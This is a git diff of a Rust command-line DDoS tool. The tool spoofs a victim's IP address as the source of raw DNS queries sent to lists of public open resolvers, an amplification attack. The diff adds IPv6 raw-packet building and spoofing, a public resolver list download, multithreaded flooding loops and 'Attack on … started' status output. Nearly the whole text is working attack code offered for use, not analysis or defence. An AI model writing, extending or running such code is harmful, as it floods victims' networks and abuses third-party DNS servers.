@@ -2,11 +2,7 @@ use std::fs::File;
 use std::io::{self, BufRead, BufReader, Error, ErrorKind};
 use std::mem;
 use std::mem::size_of;
-<<<<<<< HEAD
-use std::net::{IpAddr, Ipv4Addr};
-=======
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
->>>>>>> a5eef19 (PacketBuilder traits)
 use std::str::FromStr;
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::Arc;
@@ -15,14 +11,16 @@ use std::time::Duration;
 use clap::{arg, command, Parser};
 
 use pnet::packet::ipv4::MutableIpv4Packet;
+use pnet::packet::ipv6::MutableIpv6Packet;
 use pnet::packet::udp::MutableUdpPacket;
+use pnet::packet::util::ipv6_checksum;
 use pnet::packet::Packet;
 
 use reqwest;
 use tokio::time::Instant;
 use tokio::{self, signal};
 
-use libc::{sendto, sockaddr, sockaddr_in, AF_INET, IPPROTO_RAW, SOCK_RAW};
+use libc::{sendto, sockaddr, sockaddr_in, sockaddr_in6, AF_INET, IPPROTO_RAW, SOCK_RAW};
 
 static PACKETS_SENT: AtomicU64 = AtomicU64::new(0);
 
@@ -40,14 +38,14 @@ fn colorize(text: &str, color: &str) -> String {
     format!("\x1B[{}m{}\x1B[0m", color, text)
 }
 
-async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
+async fn get_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
     let response = client.get(url).send().await?.text().await?;
     let servers = response.lines().map(|s| s.trim().to_string()).collect();
     Ok(servers)
 }
 
-fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
+fn read_dns_servers(file: &str) -> io::Result<Vec<String>> {
     let file = File::open(file)?;
     let reader = BufReader::new(file);
 
@@ -65,34 +63,21 @@ fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
     Ok(dns_servers)
 }
 
-fn filter_ipv4_addresses(servers: Vec<String>) -> Vec<String> {
-    servers
+fn filter_dns_servers(servers: Vec<String>, ip_type: IpAddr) -> io::Result<Vec<String>> {
+    let filtered_servers: Vec<String> = servers
         .into_iter()
-        .filter_map(|s| match s.parse::<IpAddr>() {
-            Ok(IpAddr::V4(_)) => Some(s),
-            _ => None,
+        .filter(|server| {
+            if let Ok(ip) = IpAddr::from_str(server) {
+                match ip_type {
+                    IpAddr::V4(_) => matches!(ip, IpAddr::V4(_)),
+                    IpAddr::V6(_) => matches!(ip, IpAddr::V6(_)),
+                }
+            } else {
+                false
+            }
         })
-        .collect()
-}
-
-fn send_dns_query(
-    dst_ip: Ipv4Addr,
-    domain: &str,
-    source_ip: Ipv4Addr,
-    source_port: u16,
-    record_type: &str,
-) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let dns_query_payload = build_dns_query(domain, record_type);
-    let udp_payload = build_udp_packet(source_port, 53, source_ip, dst_ip, &dns_query_payload);
-    let ip_payload = build_ip_packet(source_ip, dst_ip, &udp_payload);
-
-    match send_raw_packet(dst_ip, &ip_payload) {
-        Ok(_) => {
-            PACKETS_SENT.fetch_add(1, Ordering::Relaxed);
-            Ok(())
-        }
-        Err(err) => Err(Box::new(err)),
-    }
+        .collect();
+    Ok(filtered_servers)
 }
 
 fn build_dns_query(domain: &str, record_type: &str) -> Vec<u8> {
@@ -139,15 +124,15 @@ trait PacketBuilder<IpAddr> {
     fn build_udp_packet(
         &self,
         src_port: u16,
-        dst_ip: IpAddr,
+        dst_ip: &IpAddr,
         dst_port: u16,
         payload: &[u8],
     ) -> Vec<u8>;
-    fn build_ip_packet(&self, dst_ip: IpAddr, payload: &[u8]) -> Vec<u8>;
+    fn build_ip_packet(&self, dst_ip: &IpAddr, payload: &[u8]) -> Vec<u8>;
     fn send_raw_packet(&self, packet: &[u8]) -> Result<(), Error>;
     fn send_dns_query(
         &self,
-        dst_ip: IpAddr,
+        dst_ip: &IpAddr,
         domain: &str,
         source_port: u16,
         record_type: &str,
@@ -158,7 +143,7 @@ impl PacketBuilder<Ipv4Addr> for Ipv4Addr {
     fn build_udp_packet(
         &self,
         src_port: u16,
-        dst_ip: Ipv4Addr,
+        dst_ip: &Ipv4Addr,
         dst_port: u16,
         payload: &[u8],
     ) -> Vec<u8> {
@@ -175,7 +160,7 @@ impl PacketBuilder<Ipv4Addr> for Ipv4Addr {
         udp_packet.to_immutable().packet().to_vec()
     }
 
-    fn build_ip_packet(&self, dst_ip: Ipv4Addr, payload: &[u8]) -> Vec<u8> {
+    fn build_ip_packet(&self, dst_ip: &Ipv4Addr, payload: &[u8]) -> Vec<u8> {
         let mut ipv4_packet = MutableIpv4Packet::owned(vec![0u8; 20 + payload.len()]).unwrap();
 
         ipv4_packet.set_version(4);
@@ -189,7 +174,7 @@ impl PacketBuilder<Ipv4Addr> for Ipv4Addr {
         ipv4_packet.set_ttl(64);
         ipv4_packet.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocols::Udp);
         ipv4_packet.set_source(*self);
-        ipv4_packet.set_destination(dst_ip);
+        ipv4_packet.set_destination(*dst_ip);
         ipv4_packet.set_payload(&payload);
 
         let checksum = pnet::packet::ipv4::checksum(&ipv4_packet.to_immutable());
@@ -200,7 +185,7 @@ impl PacketBuilder<Ipv4Addr> for Ipv4Addr {
 
     fn send_dns_query(
         &self,
-        dst_ip: Ipv4Addr,
+        dst_ip: &Ipv4Addr,
         domain: &str,
         source_port: u16,
         record_type: &str,
@@ -209,9 +194,13 @@ impl PacketBuilder<Ipv4Addr> for Ipv4Addr {
         let udp_payload = self.build_udp_packet(source_port, dst_ip, 53, &dns_query_payload);
         let ip_payload = self.build_ip_packet(dst_ip, &udp_payload);
 
-        dst_ip.send_raw_packet(&ip_payload)?;
-
-        Ok(())
+        match dst_ip.send_raw_packet(&ip_payload) {
+            Ok(_) => {
+                PACKETS_SENT.fetch_add(1, Ordering::Relaxed);
+                Ok(())
+            }
+            Err(err) => Err(Box::new(err)),
+        }
     }
 
     fn send_raw_packet(&self, packet: &[u8]) -> Result<(), Error> {
@@ -258,44 +247,160 @@ impl PacketBuilder<Ipv4Addr> for Ipv4Addr {
     }
 }
 
-async fn amplify(
-    dns_servers: Vec<String>,
-    domain: String,
-    source_ip: String,
+impl PacketBuilder<Ipv6Addr> for Ipv6Addr {
+    fn build_udp_packet(
+        &self,
+        src_port: u16,
+        dst_ip: &Ipv6Addr,
+        dst_port: u16,
+        payload: &[u8],
+    ) -> Vec<u8> {
+        let mut udp_packet = MutableUdpPacket::owned(vec![0u8; 8 + payload.len()]).unwrap();
+
+        udp_packet.set_source(src_port);
+        udp_packet.set_destination(dst_port);
+        udp_packet.set_length(8 + payload.len() as u16);
+        udp_packet.set_payload(payload);
+
+        let checksum = ipv6_checksum(
+            &udp_packet.to_immutable().packet()[..],
+            0,
+            &[],
+            &self,
+            &dst_ip,
+            pnet::packet::ip::IpNextHeaderProtocols::Udp,
+        );
+        udp_packet.set_checksum(checksum);
+
+        udp_packet.to_immutable().packet().to_vec()
+    }
+
+    fn build_ip_packet(&self, dst_ip: &Ipv6Addr, payload: &[u8]) -> Vec<u8> {
+        let mut ipv6_packet = MutableIpv6Packet::owned(vec![0u8; 40 + payload.len()]).unwrap();
+
+        ipv6_packet.set_version(6);
+        ipv6_packet.set_traffic_class(0xFF);
+        ipv6_packet.set_flow_label(0);
+        ipv6_packet.set_payload_length(payload.len() as u16);
+        ipv6_packet.set_next_header(pnet::packet::ip::IpNextHeaderProtocols::Udp);
+        ipv6_packet.set_hop_limit(64);
+        ipv6_packet.set_source(*self);
+        ipv6_packet.set_destination(*dst_ip);
+        ipv6_packet.set_payload(payload);
+        ipv6_packet.to_immutable().packet().to_vec()
+    }
+
+    fn send_dns_query(
+        &self,
+        dst_ip: &Ipv6Addr,
+        domain: &str,
+        source_port: u16,
+        record_type: &str,
+    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+        let dns_query_payload = build_dns_query(domain, record_type);
+        let udp_payload = self.build_udp_packet(source_port, dst_ip, 53, &dns_query_payload);
+        let ip_payload = self.build_ip_packet(dst_ip, &udp_payload);
+
+        match dst_ip.send_raw_packet(&ip_payload) {
+            Ok(_) => {
+                PACKETS_SENT.fetch_add(1, Ordering::Relaxed);
+                Ok(())
+            }
+            Err(err) => Err(Box::new(err)),
+        }
+    }
+
+    fn send_raw_packet(&self, packet: &[u8]) -> Result<(), Error> {
+        let sock = unsafe { libc::socket(libc::AF_INET6, libc::SOCK_RAW, libc::IPPROTO_RAW) };
+        if sock == -1 {
+            return Err(Error::last_os_error());
+        }
+
+        let sockaddr = sockaddr_in6 {
+            sin6_family: libc::AF_INET6 as u16,
+            sin6_port: 0,
+            sin6_flowinfo: 0,
+            sin6_addr: libc::in6_addr {
+                s6_addr: self.octets(),
+            },
+            sin6_scope_id: 0,
+        };
+        let sockaddr_ptr = &sockaddr as *const _ as *const libc::sockaddr;
+
+        let send_bytes = unsafe {
+            libc::sendto(
+                sock,
+                packet.as_ptr() as *const libc::c_void,
+                packet.len(),
+                0,
+                sockaddr_ptr,
+                size_of::<sockaddr_in6>() as libc::socklen_t,
+            )
+        };
+
+        if send_bytes != packet.len() as isize {
+            let err = Error::new(ErrorKind::Other, "Failed to send packet");
+            unsafe { libc::close(sock) };
+            return Err(err);
+        }
+
+        let res = unsafe { libc::close(sock) };
+        if res == -1 {
+            return Err(Error::last_os_error());
+        }
+
+        Ok(())
+    }
+}
+
+fn amplify(
+    dns_servers: &Vec<IpAddr>,
+    domain: &str,
+    source_ip: &IpAddr,
     source_port: u16,
     record_type: String,
     aborted: Arc<AtomicBool>,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let source_ip = match Ipv4Addr::from_str(&source_ip) {
-        Ok(ip) => ip,
-        Err(_) => return Err("Invalid source IP address".into()),
-    };
-
     while !aborted.load(Ordering::Relaxed) {
-        for dns_server in &dns_servers {
+        for dns_server in dns_servers {
             if aborted.load(Ordering::Relaxed) {
                 break;
             }
-            let dns_server = match Ipv4Addr::from_str(&dns_server) {
-                Ok(ip) => ip,
-                Err(_) => {
-                    println!(
-                        "[{}] Invalid DNS server address: {}",
-                        colorize("WARNING", "yellow"),
-                        dns_server
+
+            match (source_ip, dns_server) {
+                (IpAddr::V4(src_ipv4), IpAddr::V4(dns_ipv4)) => {
+                    if let Err(e) =
+                        src_ipv4.send_dns_query(dns_ipv4, domain, source_port, &record_type)
+                    {
+                        eprintln!(
+                            "[{}] Failed to send DNS query: {}",
+                            colorize("WARNING", "yellow"),
+                            e
+                        );
+                        continue;
+                    }
+                }
+                (IpAddr::V6(src_ipv6), IpAddr::V6(dns_ipv6)) => {
+                    if let Err(e) =
+                        src_ipv6.send_dns_query(dns_ipv6, domain, source_port, &record_type)
+                    {
+                        eprintln!(
+                            "[{}] Failed to send DNS query: {}",
+                            colorize("WARNING", "yellow"),
+                            e
+                        );
+                        continue;
+                    }
+                }
+                _ => {
+                    eprintln!(
+                        "[{}] Mismatched types for source and destination IPs: {} and {}",
+                        colorize("ERROR", "red"),
+                        colorize(&source_ip.to_string(), "magenta"),
+                        colorize(&dns_server.to_string(), "magenta")
                     );
                     continue;
                 }
-            };
-            if let Err(e) =
-                send_dns_query(dns_server, &domain, source_ip, source_port, &record_type)
-            {
-                eprintln!(
-                    "[{}] Failed to send DNS query: {}",
-                    colorize("WARNING", "yellow"),
-                    e
-                );
-                continue;
             }
         }
     }
@@ -375,21 +480,58 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let args = Args::parse();
     let record_type = args.record_type.unwrap();
+
     let source_ip = args.target;
+    let source_ip = match IpAddr::from_str(&source_ip) {
+        Ok(ip) => ip,
+        Err(_) => {
+            eprintln!(
+                "[{}] Invalid target IP address {}",
+                colorize("ERROR", "red"),
+                colorize(&source_ip, "magenta")
+            );
+            std::process::exit(1);
+        }
+    };
+
     let source_port = args.port;
     let time = args.time;
     let domain = args.domain.unwrap();
     let threads = args.threads.unwrap();
-    let mut dns_servers: Vec<String>;
 
+    let dns_servers: Vec<String>;
     if args.server_list.is_none() && args.dns_resolver.is_none() {
-        dns_servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
+        dns_servers = match get_dns_servers("https://public-dns.info/nameservers.txt").await {
+            Ok(servers) => servers,
+            Err(e) => {
+                eprintln!(
+                    "[{}] Failed to get DNS servers: {}",
+                    colorize("ERROR", "red"),
+                    e
+                );
+                std::process::exit(1);
+            }
+        };
     } else if args.dns_resolver.is_some() {
         dns_servers = args.dns_resolver.map(|s| vec![s]).unwrap_or(vec![]);
     } else {
-        dns_servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
+        dns_servers = read_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
     }
-    dns_servers = filter_ipv4_addresses(dns_servers);
+    let dns_servers: Vec<IpAddr> = match filter_dns_servers(dns_servers.clone(), source_ip.clone())
+    {
+        Ok(servers) => servers
+            .into_iter()
+            .filter_map(|server| IpAddr::from_str(&server).ok())
+            .collect(),
+        Err(e) => {
+            eprintln!(
+                "[{}] Failed to filter DNS servers: {}",
+                colorize("ERROR", "red"),
+                e
+            );
+            std::process::exit(1);
+        }
+    };
 
     let aborted = Arc::new(AtomicBool::new(false));
     let start_time = Instant::now();
@@ -397,7 +539,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!(
         "[{}] Attack on {} started with {} threads...",
         colorize("INFO", "magenta"),
-        colorize(&source_ip, "green"),
+        colorize(&source_ip.to_string(), "green"),
         colorize(&threads.to_string(), "red")
     );
 
@@ -414,18 +556,16 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let task = tokio::spawn(async move {
             if let Err(e) = amplify(
-                dns_servers,
-                domain,
-                source_ip,
+                &dns_servers,
+                &domain,
+                &source_ip,
                 source_port,
                 record_type,
                 aborted,
-            )
-            .await
-            {
+            ) {
                 eprintln!(
                     "[{}] Amplify task failed: {}",
-                    colorize("warning", "yellow"),
+                    colorize("WARNING", "yellow"),
                     e
                 );
             }
@@ -459,12 +599,20 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     for task in amplify_tasks {
         if let Err(e) = task.await {
-            eprintln!("Amplify task encountered an error: {:?}", e);
+            eprintln!(
+                "[{}] Amplify task encountered an error: {}",
+                colorize("ERROR", "red"),
+                e
+            );
         }
     }
 
     if let Err(e) = status_task.await {
-        eprintln!("Status update task encountered an error: {:?}", e);
+        eprintln!(
+            "[{}] Status update task encountered an error: {}",
+            colorize("ERROR", "red"),
+            e
+        );
     }
 
     println!(
